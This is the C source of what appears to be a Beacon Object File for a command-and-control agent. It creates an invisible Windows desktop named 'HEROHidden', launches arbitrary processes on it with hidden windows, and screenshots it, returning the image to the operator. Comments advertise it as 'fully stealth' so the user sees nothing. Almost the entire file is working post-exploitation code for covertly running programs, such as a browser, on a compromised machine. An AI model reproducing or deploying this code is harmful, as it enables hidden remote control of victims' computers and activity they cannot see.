// hidden_desktop.c — BOF for stealthy hidden desktop operations
//
// Features:
//   1. Create a hidden desktop (invisible to user)
//   2. Capture screenshot from hidden desktop
//   3. List running hidden desktops
//   4. Switch thread to hidden desktop
//   5. Close/destroy hidden desktop
//
// Compilation:
//   x86_64-w64-mingw32-gcc -c hidden_desktop.c -o hidden_desktop.x64.o -DBOF  but this file compile to build.sh file with all framework files 
//
// Usage via agent:
//   bof hidden_desktop start    — creates "HEROHidden" desktop
//   bof hidden_desktop screenshot — captures screenshot from hidden desktop
//   bof hidden_desktop list     — lists all desktops
//   bof hidden_desktop stop     — closes hidden desktop
//
// Stealth notes:
//   - Hidden desktop is created with DESKTOP_CREATEWINDOW flag
//   - No visible windows appear on user's screen
//   - GUI operations (calc, notepad, browser) run in hidden desktop
//   - Screenshots capture the hidden desktop's content
//   - User sees nothing — fully stealth

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// BOF BeaconAPI prototypes
#ifdef BOF
void BeaconPrintf(int type, const char *fmt, ...);
void BeaconOutput(int type, const char *data, int len);

// B-CR7: packed-args parser types + prototypes (see bofs/include/beacon.h).
// Declared inline (instead of #include "beacon.h") because both build.rs
// and build_hidden_desktop.sh compile this file without -I bofs/include —
// matching the inline-declaration pattern already used for Beacon*Output
// above keeps the build wiring untouched.
typedef struct {
    char *original;
    char *buffer;
    int   size;
    int   length;
} datap;
void  BeaconDataParse(datap *parser, char *buffer, int size);
char *BeaconDataExtract(datap *parser, int *size);

#define BOF_PRINT(fmt, ...)  BeaconPrintf(0, fmt, ##__VA_ARGS__)
#define BOF_OUTPUT(data, len) BeaconOutput(0, data, len)
#define CALLER_FORMAT_INT "%d"
#else
// For testing as standalone exe
#include <stdarg.h>
static char g_test_output[65536];
static int g_test_pos = 0;
void BeaconPrintf(int type, const char *fmt, ...) {
    va_list args; va_start(args, fmt);
    g_test_pos += vsnprintf(g_test_output + g_test_pos, sizeof(g_test_output) - g_test_pos, fmt, args);
    va_end(args);
}
void BeaconOutput(int type, const char *data, int len) {
    int avail = sizeof(g_test_output) - g_test_pos - 1;
    int w = len < avail ? len : avail;
    memcpy(g_test_output + g_test_pos, data, w);
    g_test_pos += w;
}
#define BOF_PRINT(fmt, ...)  BeaconPrintf(0, fmt, ##__VA_ARGS__)
#define BOF_OUTPUT(data, len) BeaconOutput(0, data, len)
#endif

#define HIDDEN_DESKTOP_NAME L"HEROHidden"
#define HIDDEN_DESKTOP_NAME_A "HEROHidden"

// ============================================================
// 1. start — Create hidden desktop + switch thread to it
// ============================================================

static int hd_start(void) {
    // Check if already exists
    HDESK existing = OpenDesktopW(HIDDEN_DESKTOP_NAME, 0, FALSE, GENERIC_ALL);
    if (existing) {
        BOF_PRINT("[!] Hidden desktop '%s' already exists\n", HIDDEN_DESKTOP_NAME_A);
        CloseDesktop(existing);
        return 1;
    }

    // Create new hidden desktop
    // DF_ALLOWOTHERACCOUNTHOOK allows cross-account access
    HDESK hDesk = CreateDesktopW(
        HIDDEN_DESKTOP_NAME,    // Name
        NULL,                   // Device
        NULL,                   // Reserved
        0,                      // Flags (0 = no DF_ALLOWOTHERACCOUNTHOOK for stealth)
        GENERIC_ALL,            // Access mask
        NULL                    // Security attributes
    );

    if (!hDesk) {
        BOF_PRINT("[-] CreateDesktopW failed: %lu\n", GetLastError());
        return 1;
    }

    // Switch current thread to hidden desktop
    // This makes all subsequent GUI operations invisible to user
    if (!SetThreadDesktop(hDesk)) {
        BOF_PRINT("[!] SetThreadDesktop failed: %lu (desktop created, but thread not switched)\n", GetLastError());
        // Desktop still created — just can't switch thread
    } else {
        BOF_PRINT("[+] Thread switched to hidden desktop\n");
    }

    BOF_PRINT("[+] Hidden desktop '%s' created successfully\n", HIDDEN_DESKTOP_NAME_A);
    BOF_PRINT("[+] GUI operations now run invisibly\n");
    BOF_PRINT("[*] Use 'bof hidden_desktop screenshot' to capture hidden desktop\n");

    // Don't close — keep it alive for operations
    return 0;
}

// ============================================================
// 2. screenshot — Capture screenshot from hidden desktop
// ============================================================

static int hd_screenshot(void) {
    HDESK hDesk = OpenDesktopW(HIDDEN_DESKTOP_NAME, 0, FALSE, GENERIC_READ);
    if (!hDesk) {
        BOF_PRINT("[-] Hidden desktop not found: %lu\n", GetLastError());
        BOF_PRINT("[*] Run 'bof hidden_desktop start' first\n");
        return 1;
    }

    // Save current desktop, switch to hidden
    HDESK hOrig = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(hDesk);

    // Get desktop DC
    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) {
        BOF_PRINT("[-] GetDC failed: %lu\n", GetLastError());
        SetThreadDesktop(hOrig);
        CloseDesktop(hDesk);
        return 1;
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    // Get bitmap bits
    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = width;
    bi.bmiHeader.biHeight = height;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    bi.bmiHeader.biCompression = BI_RGB;

    int dataLen = ((width * 3 + 3) & ~3) * height;
    uint8_t *bits = (uint8_t *)LocalAlloc(LPTR, dataLen);
    if (!bits) {
        BOF_PRINT("[-] LocalAlloc failed\n");
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        SetThreadDesktop(hOrig);
        CloseDesktop(hDesk);
        return 1;
    }

    GetDIBits(hdcMem, hBitmap, 0, height, bits, &bi, DIB_RGB_COLORS);

    // Convert to BMP file format in memory (header + pixels)
    int fileSize = 54 + dataLen;
    uint8_t *bmpFile = (uint8_t *)LocalAlloc(LPTR, fileSize);
    if (bmpFile) {
        // BMP header (14 bytes)
        bmpFile[0] = 'B'; bmpFile[1] = 'M';
        *(uint32_t *)(bmpFile + 2) = fileSize;
        *(uint32_t *)(bmpFile + 6) = 0;
        *(uint32_t *)(bmpFile + 10) = 54;

        // DIB header (40 bytes)
        *(uint32_t *)(bmpFile + 14) = 40;
        *(int32_t *)(bmpFile + 18) = width;
        *(int32_t *)(bmpFile + 22) = height;  // positive = bottom-up
        *(uint16_t *)(bmpFile + 26) = 1;
        *(uint16_t *)(bmpFile + 28) = 24;
        *(uint32_t *)(bmpFile + 30) = 0;       // BI_RGB
        *(uint32_t *)(bmpFile + 34) = dataLen;
        *(uint32_t *)(bmpFile + 38) = 2835;    // 72 DPI
        *(uint32_t *)(bmpFile + 42) = 2835;
        *(uint32_t *)(bmpFile + 46) = 0;
        *(uint32_t *)(bmpFile + 50) = 0;

        memcpy(bmpFile + 54, bits, dataLen);

        BOF_PRINT("[+] Screenshot captured: %dx%d, %d bytes\n", width, height, fileSize);
        BOF_OUTPUT((char *)bmpFile, fileSize);
        LocalFree(bmpFile);
    }

    LocalFree(bits);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    SetThreadDesktop(hOrig);
    CloseDesktop(hDesk);
    return 0;
}

// ============================================================
// 3. list — List all desktops in current window station
// ============================================================

static BOOL CALLBACK enum_desktop_cb(LPWSTR name, LPARAM lParam) {
    char ansi[256];
    WideCharToMultiByte(CP_ACP, 0, name, -1, ansi, sizeof(ansi), NULL, NULL);
    BOF_PRINT("  - %s\n", ansi);
    return TRUE;
}

static int hd_list(void) {
    BOF_PRINT("[*] Desktops in current window station:\n");
    EnumDesktopsW(GetProcessWindowStation(), enum_desktop_cb, 0);
    return 0;
}

// ============================================================
// 4. stop — Close hidden desktop
// ============================================================

static int hd_stop(void) {
    HDESK hDesk = OpenDesktopW(HIDDEN_DESKTOP_NAME, 0, FALSE, GENERIC_ALL);
    if (!hDesk) {
        BOF_PRINT("[-] Hidden desktop not found: %lu\n", GetLastError());
        return 1;
    }

    if (CloseDesktop(hDesk)) {
        BOF_PRINT("[+] Hidden desktop '%s' closed\n", HIDDEN_DESKTOP_NAME_A);
    } else {
        BOF_PRINT("[-] CloseDesktop failed: %lu\n", GetLastError());
    }
    return 0;
}

// ============================================================
// 5. exec — Run a process in hidden desktop (advanced)
// ============================================================

static int hd_exec(const char *cmdline) {
    if (!cmdline || !*cmdline) {
        BOF_PRINT("[-] Usage: bof hidden_desktop exec <command>\n");
        return 1;
    }

    HDESK hDesk = OpenDesktopW(HIDDEN_DESKTOP_NAME, 0, FALSE, GENERIC_ALL);
    if (!hDesk) {
        BOF_PRINT("[-] Hidden desktop not found. Run 'start' first.\n");
        return 1;
    }

    // Convert cmdline to wide
    wchar_t wcmd[1024];
    MultiByteToWideChar(CP_ACP, 0, cmdline, -1, wcmd, 1024);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.lpDesktop = HIDDEN_DESKTOP_NAME;  // ← process starts on hidden desktop
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    if (CreateProcessW(NULL, wcmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS,
                       NULL, NULL, &si, &pi)) {
        BOF_PRINT("[+] Process started on hidden desktop: %s (PID: %lu)\n", cmdline, pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        BOF_PRINT("[-] CreateProcessW failed: %lu\n", GetLastError());
    }

    CloseDesktop(hDesk);
    return 0;
}

// ============================================================
// Entry point — BOF "go" function
// Args format: server-packed [4B argc][4B len][subcmd][4B len][rest]
//   start                — create hidden desktop
//   screenshot           — capture screenshot
//   list                 — list desktops
//   stop                 — close hidden desktop
//   exec <cmdline>       — run process in hidden desktop
// (B-CR7: parsed via BeaconDataParse/BeaconDataExtract — see go() body.)
// ============================================================

#ifdef BOF
void go(char *args, int alen) {
    // B-CR7: server packs args as [4B argc][4B len][subcmd][4B len][rest]
    // (see server/go_server/bof.go packBofArgs). The old code did a raw
    // strchr(buf, ' ') on the packed buffer — it would treat the 4B argc
    // prefix + length bytes as part of the subcommand string, so every
    // dispatch hit the usage fallback. Now we parse via the loader-provided
    // BeaconData* API (same path as every other arsenal BOF) so the cursor
    // lives in the caller's `parser` and advances correctly across calls.
    datap parser;
    BeaconDataParse(&parser, args, alen);
    char *sub  = BeaconDataExtract(&parser, NULL);
    char *rest = BeaconDataExtract(&parser, NULL);
    if (!sub)  sub  = "";
    if (!rest) rest = "";
#else
int main(int argc, char **argv) {
    char *args = argc > 1 ? argv[1] : "start";
    int alen = (int)strlen(args);

    // Parse subcommand from args (non-BOF test path — raw space-separated)
    char buf[1024];
    int blen = alen < (int)sizeof(buf) - 1 ? alen : (int)sizeof(buf) - 1;
    memcpy(buf, args, blen);
    buf[blen] = 0;

    // Find first space (subcommand separator)
    char *sub = buf;
    char *rest = strchr(buf, ' ');
    if (rest) { *rest = 0; rest++; while (*rest == ' ') rest++; }
    else { rest = ""; }
#endif

    // Dispatch
    if (!strcmp(sub, "start")) {
        hd_start();
    } else if (!strcmp(sub, "screenshot") || !strcmp(sub, "shot")) {
        hd_screenshot();
    } else if (!strcmp(sub, "list") || !strcmp(sub, "ls")) {
        hd_list();
    } else if (!strcmp(sub, "stop") || !strcmp(sub, "close")) {
        hd_stop();
    } else if (!strcmp(sub, "exec") || !strcmp(sub, "run")) {
        hd_exec(rest);
    } else {
        BOF_PRINT("[*] Hidden Desktop BOF — Usage:\n");
        BOF_PRINT("  start       — Create hidden desktop\n");
        BOF_PRINT("  screenshot  — Capture screenshot from hidden desktop\n");
        BOF_PRINT("  list        — List all desktops\n");
        BOF_PRINT("  stop        — Close hidden desktop\n");
        BOF_PRINT("  exec <cmd>  — Run process in hidden desktop\n");
    }

#ifndef BOF
    printf("%s", g_test_output);
    return 0;
#endif
}

// BOF metadata — required for loader
#ifdef BOF
void __bof_entry(char *args, int alen) { go(args, alen); }
#endif
